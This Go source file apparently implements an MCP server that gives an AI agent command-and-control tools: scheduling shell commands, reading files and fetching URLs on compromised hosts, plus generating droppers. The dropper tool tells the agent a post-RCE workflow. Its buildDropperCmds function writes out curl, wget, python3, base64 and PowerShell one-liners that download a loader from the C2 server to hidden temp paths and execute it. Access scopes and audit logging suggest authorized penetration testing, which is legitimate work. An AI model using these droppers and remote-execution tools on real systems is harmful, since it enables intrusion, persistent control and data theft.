// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package mcp

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/dguerri/oast-mcp/internal/audit"
	"github.com/dguerri/oast-mcp/internal/auth"
	"github.com/dguerri/oast-mcp/internal/store"
	"github.com/google/uuid"
	mcpgo "github.com/mark3labs/mcp-go/mcp"
	mcpserver "github.com/mark3labs/mcp-go/server"
)

// registerAgentTools registers all agent management tools with the MCP server.
func (s *Server) registerAgentTools() {
	listTool := mcpgo.NewTool("agent_list",
		mcpgo.WithDescription("List agents registered for the current tenant. "+
			"By default, agents whose token has expired are hidden. "+
			"Pass show_expired=true to include them. "+
			"Returns agent_id, status ('online'/'offline'), capabilities, expires_at, and last_seen_at."),
		mcpgo.WithBoolean("show_expired", mcpgo.Description("Include agents whose token has expired (default: false)")),
	)

	scheduleTool := mcpgo.NewTool("agent_task_schedule",
		mcpgo.WithDescription("Schedule a task for an agent. Tasks are async — poll agent_task_status until status is 'done' or 'error'.\n\n"+
			"Available capabilities and their params:\n"+
			"  exec        — run a shell command. params: {\"cmd\": \"<shell command>\"}\n"+
			"  read_file   — read a file and return base64-encoded content. params: {\"path\": \"<absolute path>\"}\n"+
			"  fetch_url   — make an HTTP GET request. params: {\"url\": \"<url>\"}\n"+
			"  system_info — return hostname, OS, arch, current user. params: {} (none required)\n\n"+
			"The timeout_secs parameter controls the overall task deadline (default 600 s = 10 min). "+
			"The agent enforces this deadline locally, killing any subprocess when it fires. "+
			"Use agent_task_cancel to abort a pending or running task early.\n\n"+
			"The returned task_id is used to poll agent_task_status for the result."),
		mcpgo.WithString("agent_id", mcpgo.Required(), mcpgo.Description("The agent ID to schedule the task for")),
		mcpgo.WithString("capability", mcpgo.Required(), mcpgo.Description("One of: exec, read_file, fetch_url, system_info")),
		mcpgo.WithObject("params", mcpgo.Description("Parameters for the capability (see tool description for schema per capability)")),
		mcpgo.WithNumber("timeout_secs", mcpgo.Description(fmt.Sprintf("Task timeout in seconds (default %d, max 86400)", store.DefaultTaskTimeoutSecs))),
	)

	statusTool := mcpgo.NewTool("agent_task_status",
		mcpgo.WithDescription("Get the status and result of a scheduled agent task. "+
			"Status progresses: pending → running → done | error. "+
			"Poll every few seconds until status is 'done' or 'error'. "+
			"On success, 'result' contains the capability output (e.g. exec: {output, exit_code}; read_file: {content, path} base64-encoded; fetch_url: {status, body} base64-encoded). "+
			"On error, 'error' contains the error message."),
		mcpgo.WithString("task_id", mcpgo.Required(), mcpgo.Description("The task ID to check")),
	)

	cancelTool := mcpgo.NewTool("agent_task_cancel",
		mcpgo.WithDescription("Cancel a pending or running agent task. "+
			"Transitions the task to status 'error' with error 'cancelled'. "+
			"If the agent is currently connected, a cancel signal is forwarded immediately so the agent can kill the running subprocess. "+
			"Returns an error if the task does not exist or is already in a terminal state (done/error)."),
		mcpgo.WithString("task_id", mcpgo.Required(), mcpgo.Description("The task ID to cancel")),
		mcpgo.WithString("agent_id", mcpgo.Required(), mcpgo.Description("The agent ID that owns the task (needed to route the cancel signal)")),
	)

	s.mcp.AddTool(listTool, s.handleAgentList)
	s.mcp.AddTool(scheduleTool, s.handleAgentTaskSchedule)
	s.mcp.AddTool(statusTool, s.handleAgentTaskStatus)
	s.mcp.AddTool(cancelTool, s.handleAgentTaskCancel)

	targets := scanLoaderTargets(s.binDir)
	targetList := strings.Join(targets, ", ")
	if targetList == "" {
		targetList = "(none — run 'make build-loaders' on the server)"
	}
	dropperDesc := fmt.Sprintf(
		"Mint an agent token and generate delivery commands for a two-stage agent.\n"+
			"Stage 1 (loader) is tiny (~200KB for Linux, ~1.8MB for Windows) — deliver via URL or inline base64.\n"+
			"Stage 1 downloads Stage 2 (the full agent) over authenticated HTTPS and execs it.\n\n"+
			"Delivery modes (choose based on target environment):\n"+
			"  url    — target fetches loader over HTTPS. Returns curl_cmd, wget_cmd, python3_cmd in fallback order.\n"+
			"  inline — loader embedded as base64; no outbound HTTP needed. Returns b64_cmd and python3_b64_cmd fallback.\n\n"+
			"IMPORTANT — not all tools are installed on every target. Try commands in order until one succeeds:\n"+
			"  Linux url:    curl_cmd → wget_cmd → python3_cmd\n"+
			"  Linux inline: b64_cmd  → python3_b64_cmd\n"+
			"  Windows url:  curl_cmd (curl.exe is built-in since Win10 1803)\n"+
			"  Windows inline: b64_cmd (pure PowerShell, no external tools needed)\n"+
			"If a command fails with 'command not found' / 'not recognized', move to the next fallback immediately.\n\n"+
			"Workflow after achieving RCE:\n"+
			"  1. Probe target OS/arch: uname -m (Linux) or $ENV:PROCESSOR_ARCHITECTURE (Windows).\n"+
			"  2. Call agent_dropper_generate with agent_id, os_arch, ttl, and delivery mode.\n"+
			"  3. Try each command in the fallback chain until one succeeds.\n"+
			"  4. Call agent_list to confirm the agent appears as 'online'.\n"+
			"  5. Use agent_task_schedule to run capabilities (exec, read_file, fetch_url, system_info).\n\n"+
			"Available targets: %s", targetList)

	dropperTool := mcpgo.NewTool("agent_dropper_generate",
		mcpgo.WithDescription(dropperDesc),
		mcpgo.WithString("agent_id", mcpgo.Required(),
			mcpgo.Description("Meaningful name for the agent, e.g. 'web-01'")),
		mcpgo.WithString("os_arch", mcpgo.Required(),
			mcpgo.Description("Target OS and architecture. One of: "+targetList)),
		mcpgo.WithString("ttl", mcpgo.Required(),
			mcpgo.Description("Token lifetime in Go duration format, e.g. '2h', '24h', '168h'")),
		mcpgo.WithString("delivery",
			mcpgo.Description("Delivery mode: 'url' (default) returns curl/wget commands; 'inline' embeds the loader as base64 for air-gapped targets")),
	)
	s.mcp.AddTool(dropperTool, s.handleAgentDropperGenerate)
}

// agentHandlers returns the handler map for agent tools, used by CallTool.
func (s *Server) agentHandlers() map[string]mcpserver.ToolHandlerFunc {
	return map[string]mcpserver.ToolHandlerFunc{
		"agent_list":             s.handleAgentList,
		"agent_task_schedule":    s.handleAgentTaskSchedule,
		"agent_task_status":      s.handleAgentTaskStatus,
		"agent_task_cancel":      s.handleAgentTaskCancel,
		"agent_dropper_generate": s.handleAgentDropperGenerate,
	}
}

// handleAgentList handles the agent_list tool call.
func (s *Server) handleAgentList(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(audit.Event{
			TenantID: claims.TenantID,
			Subject:  claims.Subject,
			Action:   "agent.list",
			Outcome:  "denied",
		})
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	var showExpired bool
	if args := req.GetArguments(); args != nil {
		if v, ok := args["show_expired"]; ok {
			showExpired, _ = v.(bool)
		}
	}

	agents, err := s.store.ListAgents(ctx, claims.TenantID, showExpired)
	if err != nil {
		s.logger.Error("failed to list agents", "error", err)
		return toolError("failed to list agents: " + err.Error())
	}

	s.audit.Log(audit.Event{
		TenantID: claims.TenantID,
		Subject:  claims.Subject,
		Action:   "agent.list",
		Outcome:  "ok",
	})

	type agentView struct {
		AgentID      string   `json:"agent_id"`
		TenantID     string   `json:"tenant_id"`
		Name         string   `json:"name"`
		Status       string   `json:"status"`
		Capabilities []string `json:"capabilities"`
		RegisteredAt string   `json:"registered_at"`
		LastSeenAt   *string  `json:"last_seen_at,omitempty"`
		ExpiresAt    *string  `json:"expires_at,omitempty"`
	}

	views := make([]agentView, 0, len(agents))
	for _, a := range agents {
		v := agentView{
			AgentID:      a.AgentID,
			TenantID:     a.TenantID,
			Name:         a.Name,
			Status:       a.Status,
			Capabilities: a.Capabilities,
			RegisteredAt: a.RegisteredAt.Format(time.RFC3339),
		}
		if a.LastSeenAt != nil {
			ls := a.LastSeenAt.Format(time.RFC3339)
			v.LastSeenAt = &ls
		}
		if a.ExpiresAt != nil {
			ea := a.ExpiresAt.Format(time.RFC3339)
			v.ExpiresAt = &ea
		}
		views = append(views, v)
	}
	return toolJSON(views)
}

// handleAgentTaskSchedule handles the agent_task_schedule tool call.
func (s *Server) handleAgentTaskSchedule(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(audit.Event{
			TenantID: claims.TenantID,
			Subject:  claims.Subject,
			Action:   "agent.task.schedule",
			Outcome:  "denied",
		})
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	agentID := req.GetString("agent_id", "")
	if agentID == "" {
		return toolError("agent_id is required")
	}
	capability := req.GetString("capability", "")
	if capability == "" {
		return toolError("capability is required")
	}

	var params map[string]any
	if args := req.GetArguments(); args != nil {
		if p, ok := args["params"]; ok {
			params, _ = p.(map[string]any)
		}
	}

	if _, err := s.store.GetAgent(ctx, agentID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("agent not found")
		}
		s.logger.Error("failed to get agent", "error", err)
		return toolError("failed to get agent")
	}

	timeoutSecs := store.DefaultTaskTimeoutSecs
	if args := req.GetArguments(); args != nil {
		if v, ok := args["timeout_secs"]; ok {
			if f, ok := v.(float64); ok && f > 0 {
				timeoutSecs = int(f)
				if timeoutSecs > 86400 {
					return toolError("timeout_secs must not exceed 86400 (24 hours)")
				}
			}
		}
	}

	taskID := uuid.New().String()
	now := time.Now().UTC()
	timeoutAt := now.Add(time.Duration(timeoutSecs) * time.Second)
	task := &store.Task{
		TaskID:      taskID,
		AgentID:     agentID,
		TenantID:    claims.TenantID,
		ScheduledBy: claims.Subject,
		Capability:  capability,
		Params:      params,
		Status:      "pending",
		CreatedAt:   now,
		TimeoutSecs: timeoutSecs,
		TimeoutAt:   &timeoutAt,
	}
	if err := s.store.EnqueueTask(ctx, task); err != nil {
		s.logger.Error("failed to enqueue task", "error", err)
		return toolError("failed to schedule task: " + err.Error())
	}

	s.audit.Log(audit.Event{
		TenantID: claims.TenantID,
		Subject:  claims.Subject,
		Action:   "agent.task.schedule",
		Resource: taskID,
		Outcome:  "ok",
	})

	return toolJSON(map[string]any{
		"task_id":      taskID,
		"agent_id":     agentID,
		"capability":   capability,
		"status":       "pending",
		"timeout_secs": timeoutSecs,
		"timeout_at":   timeoutAt.Format(time.RFC3339),
		"created_at":   now.Format(time.RFC3339),
	})
}

// handleAgentTaskCancel handles the agent_task_cancel tool call.
func (s *Server) handleAgentTaskCancel(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(audit.Event{
			TenantID: claims.TenantID,
			Subject:  claims.Subject,
			Action:   "agent.task.cancel",
			Outcome:  "denied",
		})
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	taskID := req.GetString("task_id", "")
	if taskID == "" {
		return toolError("task_id is required")
	}
	agentID := req.GetString("agent_id", "")
	if agentID == "" {
		return toolError("agent_id is required")
	}

	if _, err := s.store.GetTask(ctx, taskID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("task not found")
		}
		s.logger.Error("failed to get task for cancel", "error", err)
		return toolError("failed to get task")
	}

	// Fall back to store-only cancel when no agent server is configured.
	if s.agentSrv != nil {
		if err := s.agentSrv.SendCancel(ctx, taskID, agentID, claims.TenantID); err != nil {
			if errors.Is(err, store.ErrNotFound) {
				return toolError("task is already in a terminal state")
			}
			s.logger.Error("failed to cancel task", "error", err)
			return toolError("failed to cancel task")
		}
	} else {
		if err := s.store.CancelTask(ctx, taskID, claims.TenantID); err != nil {
			if errors.Is(err, store.ErrNotFound) {
				return toolError("task is already in a terminal state")
			}
			s.logger.Error("failed to cancel task", "error", err)
			return toolError("failed to cancel task")
		}
	}

	s.audit.Log(audit.Event{
		TenantID: claims.TenantID,
		Subject:  claims.Subject,
		Action:   "agent.task.cancel",
		Resource: taskID,
		Outcome:  "ok",
	})

	return toolJSON(map[string]any{
		"task_id":  taskID,
		"agent_id": agentID,
		"status":   "cancelled",
	})
}

// handleAgentTaskStatus handles the agent_task_status tool call.
func (s *Server) handleAgentTaskStatus(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(audit.Event{
			TenantID: claims.TenantID,
			Subject:  claims.Subject,
			Action:   "agent.task.status",
			Outcome:  "denied",
		})
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	taskID := req.GetString("task_id", "")
	if taskID == "" {
		return toolError("task_id is required")
	}

	task, err := s.store.GetTask(ctx, taskID, claims.TenantID)
	if err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("task not found")
		}
		s.logger.Error("failed to get task", "error", err)
		return toolError("failed to get task")
	}

	s.audit.Log(audit.Event{
		TenantID: claims.TenantID,
		Subject:  claims.Subject,
		Action:   "agent.task.status",
		Resource: taskID,
		Outcome:  "ok",
	})

	type taskView struct {
		TaskID      string         `json:"task_id"`
		AgentID     string         `json:"agent_id"`
		Capability  string         `json:"capability"`
		Status      string         `json:"status"`
		CreatedAt   string         `json:"created_at"`
		StartedAt   *string        `json:"started_at,omitempty"`
		CompletedAt *string        `json:"completed_at,omitempty"`
		Result      map[string]any `json:"result,omitempty"`
		Err         string         `json:"error,omitempty"`
	}

	v := taskView{
		TaskID:     task.TaskID,
		AgentID:    task.AgentID,
		Capability: task.Capability,
		Status:     task.Status,
		CreatedAt:  task.CreatedAt.Format(time.RFC3339),
		Result:     task.Result,
		Err:        task.Err,
	}
	if task.StartedAt != nil {
		sa := task.StartedAt.Format(time.RFC3339)
		v.StartedAt = &sa
	}
	if task.CompletedAt != nil {
		ca := task.CompletedAt.Format(time.RFC3339)
		v.CompletedAt = &ca
	}
	return toolJSON(v)
}

// handleAgentDropperGenerate handles the agent_dropper_generate tool call.
func (s *Server) handleAgentDropperGenerate(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(audit.Event{TenantID: claims.TenantID, Subject: claims.Subject,
			Action: "agent.dropper.generate", Outcome: "denied"})
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	agentID := req.GetString("agent_id", "")
	osArch := req.GetString("os_arch", "")
	ttlStr := req.GetString("ttl", "")
	delivery := req.GetString("delivery", "url")

	ttl, errMsg := parseDropperParams(agentID, osArch, ttlStr, delivery)
	if errMsg != "" {
		return toolError(errMsg)
	}

	loaderName := loaderNameForArch(osArch)
	loaderBytes, err := os.ReadFile(filepath.Join(s.binDir, loaderName))
	if err != nil {
		return toolError("no loader available for os_arch: " + osArch +
			" (run 'make build-loaders' on the server)")
	}

	// The JWT embeds both tenantID and agentID; the agent server treats
	// these claims as the sole source of identity.
	token, err := s.auth.IssueAgent(claims.TenantID, agentID, []string{"agent:connect"}, ttl)
	if err != nil {
		s.logger.Error("failed to mint agent token", "err", err)
		return toolError("failed to mint token")
	}

	expiresAt := time.Now().Add(ttl).UTC()
	loaderB64 := base64.StdEncoding.EncodeToString(loaderBytes)
	downloadURL := s.agentBaseURL + "/dl/" + loaderName
	launchArgs := fmt.Sprintf("%s %s %s", s.agentBaseURL, token, agentID)

	cmds := buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs)

	s.audit.Log(audit.Event{TenantID: claims.TenantID, Subject: claims.Subject,
		Action: "agent.dropper.generate", Resource: agentID, Outcome: "ok"})

	result := map[string]any{
		"agent_id":   agentID,
		"os_arch":    osArch,
		"token":      token,
		"expires_at": expiresAt.Format(time.RFC3339),
		"server_url": s.agentBaseURL,
		"delivery":   delivery,
	}
	if delivery == "url" {
		result["download_url"] = downloadURL
		result["curl_cmd"] = cmds.curlCmd
		if cmds.wgetCmd != "" {
			result["wget_cmd"] = cmds.wgetCmd
		}
		if cmds.python3Cmd != "" {
			result["python3_cmd"] = cmds.python3Cmd
		}
	} else {
		result["b64_cmd"] = cmds.b64Cmd
		if cmds.python3B64Cmd != "" {
			result["python3_b64_cmd"] = cmds.python3B64Cmd
		}
	}
	return toolJSON(result)
}

// parseDropperParams validates agent dropper parameters and returns the parsed TTL.
// Returns a non-empty error message string on failure.
func parseDropperParams(agentID, osArch, ttlStr, delivery string) (time.Duration, string) {
	if agentID == "" || osArch == "" || ttlStr == "" {
		return 0, "agent_id, os_arch, and ttl are all required"
	}
	if delivery != "url" && delivery != "inline" {
		return 0, "delivery must be 'url' or 'inline'"
	}
	ttl, err := time.ParseDuration(ttlStr)
	if err != nil || ttl <= 0 {
		return 0, "invalid ttl: use Go duration format e.g. '2h', '24h'"
	}
	if ttl > 168*time.Hour {
		return 0, "ttl must not exceed 168h (7 days)"
	}
	return ttl, ""
}

// loaderNameForArch returns the loader binary filename for the given os/arch pair.
func loaderNameForArch(osArch string) string {
	name := "loader-" + osArch
	if strings.HasPrefix(osArch, "windows-") {
		name += ".exe"
	}
	return name
}

type dropperCmds struct {
	curlCmd       string
	wgetCmd       string
	python3Cmd    string
	b64Cmd        string
	python3B64Cmd string
}

func buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs string) dropperCmds {
	if strings.HasPrefix(osArch, "windows-") {
		return dropperCmds{
			curlCmd: fmt.Sprintf(
				`curl.exe -fsSL "%s" -o "$env:TEMP\l.exe" && & "$env:TEMP\l.exe" %s`,
				downloadURL, launchArgs),
			b64Cmd: fmt.Sprintf(
				`[IO.File]::WriteAllBytes("$env:TEMP\l.exe",[Convert]::FromBase64String("%s")); & "$env:TEMP\l.exe" %s`,
				loaderB64, launchArgs),
		}
	}
	return dropperCmds{
		curlCmd: fmt.Sprintf(
			`curl -fsSL '%s' -o /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
			downloadURL, launchArgs),
		wgetCmd: fmt.Sprintf(
			`wget -qO /tmp/.l '%s' && chmod +x /tmp/.l && /tmp/.l %s`,
			downloadURL, launchArgs),
		python3Cmd: fmt.Sprintf(
			`python3 -c "import urllib.request,os; urllib.request.urlretrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
			downloadURL, launchArgs),
		b64Cmd: fmt.Sprintf(
			`printf '%s' | base64 -d > /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
			loaderB64, launchArgs),
		python3B64Cmd: fmt.Sprintf(
			`python3 -c "import base64,os; open('/tmp/.l','wb').write(base64.b64decode('%s')); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
			loaderB64, launchArgs),
	}
}
